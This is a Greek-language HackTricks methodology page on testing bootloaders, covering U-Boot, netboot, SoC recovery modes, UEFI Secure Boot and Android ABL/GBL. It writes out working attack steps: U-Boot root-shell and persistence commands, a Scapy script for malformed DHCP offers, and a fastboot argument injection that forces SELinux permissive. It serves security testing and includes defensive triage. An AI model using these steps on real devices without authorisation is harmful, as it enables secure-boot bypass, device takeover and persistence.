# Έλεγχος Bootloader

{{#include ../../banners/hacktricks-training.md}}

Τα παρακάτω βήματα συνιστώνται για την τροποποίηση των ρυθμίσεων εκκίνησης συσκευών και τον έλεγχο bootloaders όπως οι U-Boot και UEFI-class loaders. Εστιάστε στην επίτευξη εκτέλεσης κώδικα σε πρώιμο στάδιο, στην αξιολόγηση των προστασιών signature/rollback και στην κατάχρηση διαδρομών recovery ή network-boot.

Σχετικό: MediaTek secure-boot bypass μέσω patching του bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Γρήγορες νίκες στο U-Boot και κατάχρηση του environment

1. Πρόσβαση στο interpreter shell
- Κατά την εκκίνηση, πατήστε ένα γνωστό break key (συχνά οποιοδήποτε πλήκτρο, 0, space ή μια ειδική ακολουθία της πλακέτας) πριν εκτελεστεί το `bootcmd`, ώστε να μεταβείτε στο prompt του U-Boot.

2. Έλεγχος της κατάστασης εκκίνησης και των μεταβλητών
- Χρήσιμες εντολές:
- `printenv` (dump του environment)
- `bdinfo` (πληροφορίες πλακέτας, διευθύνσεις μνήμης)
- `help bootm; help booti; help bootz` (υποστηριζόμενες μέθοδοι εκκίνησης kernel)
- `help ext4load; help fatload; help tftpboot` (διαθέσιμοι loaders)

3. Τροποποίηση των boot arguments για λήψη root shell
- Προσθέστε το `init=/bin/sh`, ώστε ο kernel να μεταβεί σε shell αντί για το κανονικό init:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot από τον TFTP server σας
- Ρυθμίστε το δίκτυο και λάβετε ένα kernel/fit image από το LAN:
```
# setenv ipaddr 192.168.2.2      # IP συσκευής
# setenv serverip 192.168.2.1    # IP TFTP server
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Διατήρηση αλλαγών μέσω του environment
- Αν η αποθήκευση του env δεν είναι write-protected, μπορείτε να διατηρήσετε τον έλεγχο:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Ελέγξτε για μεταβλητές όπως `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, οι οποίες επηρεάζουν τις διαδρομές fallback. Λανθασμένες τιμές μπορούν να επιτρέψουν επαναλαμβανόμενες διακοπές στο shell.

6. Έλεγχος debug/unsafe δυνατοτήτων
- Αναζητήστε: `bootdelay` > 0, απενεργοποιημένο `autoboot`, unrestricted `usb start; fatload usb 0:1 ...`, δυνατότητα χρήσης `loady`/`loads` μέσω serial, `env import` από untrusted media και kernels/ramdisks που φορτώνονται χωρίς signature checks.

7. Έλεγχος U-Boot image/verification
- Αν η πλατφόρμα δηλώνει secure/verified boot με FIT images, δοκιμάστε τόσο unsigned όσο και tampered images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Η απουσία των `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ή συμπεριφορά legacy `verify=n` συχνά επιτρέπει την εκκίνηση arbitrary payloads.
- Μην περιορίζεστε σε ένα απλό αποτέλεσμα allow/deny: πρόσφατη έρευνα στο FIT έδειξε ότι η ίδια η διαδρομή verification μπορεί να αποτελεί pre-auth attack surface. Εκτελέστε negative tests σε externally stored FIT data (`data-offset`, `data-position`, `data-size`), signed configuration selection, `loadables` και χειρισμό overlay / `extra-conf`.
- Αν διαθέτετε αντίστοιχο source tree, το `test/vboot/vboot_test.sh` είναι ένας γρήγορος τρόπος αναπαραγωγής της συμπεριφοράς FIT verification στο U-Boot sandbox πριν από την επαφή με πραγματικό hardware.

8. Standard Boot (`bootstd`), `extlinux` και script bootflows
- Σε σύγχρονα U-Boot builds, το `bootcmd` είναι συχνά απλώς wrapper γύρω από το Standard Boot. Αυτό σημαίνει ότι writable media, PXE ή SPI flash μπορούν να αποτελούν το πραγματικό trust boundary, ακόμη κι όταν το ορατό environment φαίνεται ασφαλές.
- Το `extlinux` bootmeth αναζητά το `extlinux/extlinux.conf` κάτω από τα `/` και `/boot`, ενώ το script bootmeth αναζητά πρώτα το `boot.scr.uimg` και έπειτα το `boot.scr`. Κατά το network boot, το όνομα του script μπορεί να προέρχεται από το `boot_script_dhcp`.
- Χρήσιμες εντολές triage:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Περιπτώσεις κατάχρησης προς έλεγχο: attacker-controlled USB/SD media νωρίτερα στο `boot_targets`, writable `/boot/extlinux/extlinux.conf`, rogue TFTP που παρέχει `boot.scr` ή εκτέλεση script μέσω SPI με χρήση του `script_offset_f`.
- Αν η πλατφόρμα βασίζεται σε FIT verification, βεβαιωθείτε ότι οι configurations είναι signed σε επίπεδο configuration και όχι μόνο ανά image. Το `required-mode=all` είναι ισχυρότερο από την αποδοχή οποιουδήποτε μεμονωμένου required key.

## Network-boot επιφάνεια (DHCP/PXE) και rogue servers

9. Fuzzing παραμέτρων PXE/DHCP
- Ο legacy χειρισμός BOOTP/DHCP του U-Boot έχει παρουσιάσει προβλήματα memory-safety. Για παράδειγμα, το CVE‑2024‑42040 περιγράφει memory disclosure μέσω crafted DHCP responses, οι οποίες μπορούν να κάνουν leak bytes από τη μνήμη του U-Boot πίσω στο δίκτυο. Ασκήστε τα DHCP/PXE code paths με υπερβολικά μεγάλα ή edge-case values (option 67 bootfile-name, vendor options, πεδία file/servername) και παρατηρήστε για hangs/leaks.
- Ελάχιστο Scapy snippet για stress στα boot parameters κατά το netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Ελέγξτε επίσης αν τα πεδία PXE filename περνούν στη shell/loader logic χωρίς sanitization όταν συνδέονται με OS-side provisioning scripts.

10. Έλεγχος command injection μέσω rogue DHCP server
- Ρυθμίστε μια rogue DHCP/PXE service και δοκιμάστε την εισαγωγή χαρακτήρων στα πεδία filename ή options, ώστε να φτάσετε σε command interpreters σε μεταγενέστερα στάδια της boot chain. Το DHCP auxiliary του Metasploit, το `dnsmasq` ή custom Scapy scripts λειτουργούν καλά. Απομονώστε πρώτα το lab network.

## SoC ROM recovery modes που παρακάμπτουν το κανονικό boot

Πολλά SoC εκθέτουν ένα BootROM "loader" mode, το οποίο δέχεται code μέσω USB/UART ακόμη και όταν τα flash images δεν είναι έγκυρα. Αν τα secure-boot fuses δεν έχουν καεί, αυτό μπορεί να προσφέρει arbitrary code execution πολύ νωρίς στη chain.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) ή `imx-usb-loader`.
- Παράδειγμα: `imx-usb-loader u-boot.imx` για push και εκτέλεση custom U-Boot από RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Παράδειγμα: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ή `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Παράδειγμα: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` για staging ενός loader και upload custom U-Boot.

Αξιολογήστε αν η συσκευή διαθέτει secure-boot eFuses/OTP που έχουν καεί. Αν όχι, τα BootROM download modes συχνά παρακάμπτουν οποιοδήποτε higher-level verification (U-Boot, kernel, rootfs), εκτελώντας το first-stage payload σας απευθείας από SRAM/DRAM.

## UEFI/PC-class bootloaders: γρήγοροι έλεγχοι

11. Έλεγχος ESP tampering, rollback και key-enrollment
- Κάντε mount το EFI System Partition (ESP) και ελέγξτε για loader components: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, paths για vendor logos.
- Κάντε dump την κατάσταση Secure Boot και τις key databases από το OS, όταν είναι δυνατό:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Αν η πλατφόρμα βρίσκεται σε Setup Mode, δέχεται unauthenticated key enrollment ή αποστέλλεται με test/default Platform Key (κλάση PKfail), ένας local admin ή physical attacker μπορεί να κάνει enroll το δικό του KEK/db και να διατηρεί το Secure Boot “enabled”, ενώ εκκινεί arbitrary EFI binaries.
- Δοκιμάστε boot με downgraded ή γνωστά ευάλωτα signed boot components, αν τα Secure Boot revocations (dbx) δεν είναι ενημερωμένα. Αν η πλατφόρμα εξακολουθεί να εμπιστεύεται παλιά shims/bootmanagers, συχνά μπορείτε να φορτώσετε δικό σας kernel ή `grub.cfg` από το ESP για να αποκτήσετε persistence.

12. Έλεγχος stale shim / SBAT / dbx revocation
- Παλιά Microsoft-signed shims και vendor forks μπορούν ακόμη να λειτουργήσουν ως BYOVD-style bootkit path, αν τα revocations είναι stale. Σε isolated lab, τοποθετήστε ένα historically vulnerable shim στο ESP και επιχειρήστε chainload του δικού σας `grubx64.efi` ή kernel.
- Γρήγορο triage:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Αν το shim εξακολουθεί να εκτελείται παρότι βρίσκεται στη revocation list, το firmware/OS έχει stale `dbx` updates ή εμπιστεύεται forked loader που δεν κληρονόμησε τις upstream SBAT protections.

13. Bugs parsing boot logo (κλάση LogoFAIL)
- Αρκετά OEM/IBV firmwares ήταν ευάλωτα σε image-parsing flaws στο DXE, το οποίο επεξεργάζεται boot logos. Αν ένας attacker μπορεί να τοποθετήσει crafted image στο ESP κάτω από vendor-specific path (π.χ. `\EFI\<vendor>\logo\*.bmp`) και να κάνει reboot, μπορεί να είναι δυνατή η εκτέλεση κώδικα κατά το early boot, ακόμη και με ενεργοποιημένο Secure Boot. Ελέγξτε αν η πλατφόρμα δέχεται user-supplied logos και αν αυτά τα paths είναι writable από το OS.


## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Σε συσκευές Android 16 που χρησιμοποιούν το ABL για να φορτώσουν το **Generic Bootloader Library (GBL)**, ελέγξτε αν το ABL **authenticates** το UEFI app που φορτώνει από το partition `efisp`. Αν το ABL ελέγχει μόνο την **presence** ενός UEFI app και δεν επαληθεύει signatures, ένα write primitive στο `efisp` μετατρέπεται σε **pre-OS unsigned code execution** κατά το boot.

Πρακτικοί έλεγχοι και abuse paths:

- **efisp write primitive**: Χρειάζεστε τρόπο εγγραφής custom UEFI app στο `efisp` (root/privileged service, bug σε OEM app, recovery/fastboot path). Χωρίς αυτό, το GBL loading gap δεν είναι άμεσα προσβάσιμο.
- **fastboot OEM argument injection** (ABL bug): Ορισμένα builds δέχονται επιπλέον tokens στο `fastboot oem set-gpu-preemption` και τα προσθέτουν στο kernel cmdline. Αυτό μπορεί να χρησιμοποιηθεί για force permissive SELinux, επιτρέποντας protected partition writes:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Αν η συσκευή έχει γίνει patch, η εντολή θα πρέπει να απορρίπτει τα extra arguments.
- **Bootloader unlock μέσω persistent flags**: Ένα boot-stage payload μπορεί να αλλάξει persistent unlock flags (π.χ. `is_unlocked=1`, `is_unlocked_critical=1`) ώστε να προσομοιώσει το `fastboot oem unlock` χωρίς OEM server/approval gates. Πρόκειται για durable posture change μετά το επόμενο reboot.

Αμυντικές σημειώσεις/σημεία triage:

- Επιβεβαιώστε αν το ABL εκτελεί signature verification στο GBL/UEFI payload από το `efisp`. Αν όχι, αντιμετωπίστε το `efisp` ως high‑risk persistence surface.
- Ελέγξτε αν οι ABL fastboot OEM handlers έχουν γίνει patch ώστε να **validate argument counts** και να απορρίπτουν επιπλέον tokens.

## Προσοχή κατά την εργασία με hardware

Να είστε προσεκτικοί κατά την αλληλεπίδραση με SPI/NAND flash κατά το early boot (π.χ. grounding pins για bypass reads) και να συμβουλεύεστε πάντα το flash datasheet. Shorts σε λάθος χρονική στιγμή μπορούν να καταστρέψουν τη συσκευή ή τον programmer.

## Σημειώσεις και επιπλέον συμβουλές

- Δοκιμάστε `env export -t ${loadaddr}` και `env import -t ${loadaddr}` για τη μεταφορά environment blobs μεταξύ RAM και storage. Ορισμένες πλατφόρμες επιτρέπουν την εισαγωγή env από removable media χωρίς authentication.
- Για persistence σε Linux-based systems που εκκινούν μέσω `extlinux.conf`, η τροποποίηση της γραμμής `APPEND` (για injection των `init=/bin/sh` ή `rd.break`) στο boot partition είναι συχνά αρκετή όταν δεν επιβάλλονται signature checks.
- Αν ο στόχος χρησιμοποιεί dual-slot / A/B updates, ελέγξτε τις τεχνικές anti-rollback και slot-desync στο [firmware analysis overview](README.md), ώστε να μην παραλείψετε trust gaps που υπάρχουν μόνο στον updater και όχι στον ίδιο τον bootloader.
- Αν το userland παρέχει `fw_printenv/fw_setenv`, επιβεβαιώστε ότι το `/etc/fw_env.config` αντιστοιχεί στο πραγματικό env storage. Λανθασμένα offsets επιτρέπουν την ανάγνωση/εγγραφή σε λάθος MTD region.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
